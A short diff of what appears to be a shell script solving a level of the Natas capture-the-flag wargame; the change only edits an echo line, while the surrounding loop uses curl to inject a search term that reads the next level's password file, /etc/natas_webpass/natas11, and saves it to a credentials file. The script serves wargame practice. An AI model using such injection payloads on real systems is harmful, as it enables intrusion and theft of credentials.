@@ -11,7 +11,7 @@ do
   next_password=$(curl -u $web_auth -sL $url -G --data-urlencode "needle=$key /etc/natas_webpass/natas11" --data-urlencode "submit=Search" | grep "natas11" | cut -d ":" -f 2)
   if [ ${#next_password} -gt 0 ]
   then
-    echo -n "[+] Password for the next level: $next_password\n"
+    echo -n "[+] Password for the next level: $next_password"
     echo "natas11:$next_password" >> ./credentials
     exit
   fi
